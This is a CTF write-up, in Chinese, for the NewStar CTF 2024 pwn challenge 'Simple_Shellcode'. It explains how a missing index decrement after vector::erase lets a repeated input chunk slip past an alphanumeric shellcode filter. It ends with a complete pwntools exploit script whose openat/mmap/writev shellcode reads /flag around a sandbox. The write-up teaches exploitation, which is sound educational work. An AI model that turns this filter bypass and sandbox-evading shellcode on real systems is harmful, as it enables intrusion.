---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# Simple_Shellcode

程序有两个功能

![运行程序](/assets/images/wp/2024/week5/simple_shellcode_1.png)

一是输入 shellcode，二是运行 shellcode

```cpp
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+Ch] [rbp-34h] BYREF
  _QWORD v4[6]; // [rsp+10h] [rbp-30h] BYREF

  v4[3] = __readfsqword(0x28u);
  sub_3602();
  sub_BEEE((__int64)v4);
  while ( 1 )
  {
    sub_3A6D();
    std::istream::operator>>(&std::cin, &v3);
    if ( v3 == 1 )
    {
      sub_3ADC((__int64)v4);
    }
    else if ( v3 == 2 )
    {
      sub_3C67(v4);
      sub_3E3A((__int64)v4);
    }
    else
    {
      std::operator<<<std::char_traits<char>>(&std::cout, "浣犲湪鍋氫粈涔堝憿馃槨馃槨馃槨");
    }
  }
}
```

其中，`v4` 是用来存储 shellcode 的 `vector`

```cpp
std::vector<std::string> code;
```

在输入功能中，一次只能输入 8 个字符

检测功能中，如果检测到 shellcode 含有非字母或数字，就会删掉这段 shellcode

```cpp
if ( (unsigned __int8)sub_B9F1(v4, v3) != 1 )
    {
      v8 = sub_C962((__int64)a1);
      v9 = sub_C9AE(&v8, i);
      sub_CA14(&v10, &v9);
      sub_CA42(a1, v10);
      v5 = std::operator<<<std::char_traits<char>>(&std::cout, &unk_F130);
      std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
    }
```

<Container type='tip'>

当然，使用 AE64 直接生成 shellcode 也是可以的
</Container>

```cpp
for (i = 0; i < code.size(); i++) {
    auto line = code[i];
    if (!std::all_of(line.begin(), line.end(), [](char c) {
        return (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z');
    })) {
        code.erase(code.begin() + i);
        std::cout << "想什么呢雑魚, 非字母是不行的😡😡😡" << std::endl;
    }
}
```

```cpp
template<typename _Tp, typename _Alloc>
   typename vector<_Tp, _Alloc>::iterator
   vector<_Tp, _Alloc>::
   _M_erase(iterator __position)
   {
     if (__position + 1 != end())
_GLIBCXX_MOVE3(__position + 1, end(), __position);
     --this->_M_impl._M_finish;
     _Alloc_traits::destroy(this->_M_impl, this->_M_impl._M_finish);
     _GLIBCXX_ASAN_ANNOTATE_SHRINK(1);
     return __position;
   }
```

通过查看 `erase` 的源码，发现 `erase` 是通过将后面的元素 MOVE 到前面，然后 `--finish` 实现的

而在程序实现的删除算法中，`erase` 后没有将 `i--`，这就会导致，如果 `idx=2` 的元素被删除了，`i++`（`i=3`），而 `erase` 会将后面的元素 MOVE 到前面，原本 `idx=3` 的元素会移动到 `idx=2`，这样会导致原本 `idx=3` 的元素绕过检测

也就是说，我们将会被删除的元素输入两次，即可绕过检测

对于沙箱，洒洒水啦：openat + mmap + writev

```python
#!/usr/bin/env python3
from pwn import *
import re

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ru = lambda x: p.recvuntil(x)

k = 1
if k:
    host = addr.split(':')
    p = remote(host[0], host[1])
else:
    p = process('./Simple_Shellcode')
elf = ELF('./Simple_Shellcode')

def debug():
    gdb.attach(p, 'b *$rebase(0x3F50)\nc\n')

def sp_input(byte_str):
    for i in range(0, len(byte_str), 8):
        chunk = byte_str[i : i + 8]

        input(chunk)

        if re.search(rb'[a-zA-Z0-9]', chunk):
            input(chunk)

def input(data):
    sla(b'Choose', b'1')
    sl(data)

def run_code():
    sla(b'Choose', b'2')

shellcode = '''
    mov rsp, rbp
'''
shellcode += shellcraft.openat(-100, "/flag", 0, 0)
shellcode += '''
    mov rdi, 0x777721000
    mov rsi, 0x100
    mov rdx, 1
    mov r10, 2
    mov r8, 3
    mov r9, 0
    mov rax, 9
    syscall
    push 1
    pop rdi
    push 0x1    /* iov size */
    pop rdx
    push 0x100
    mov rbx, 0x777721000
    push rbx
    mov rsi, rsp
    push SYS_writev
    pop rax
    syscall
'''

payload = asm(shellcode)

sp_input(payload)
run_code()

p.interactive()
```
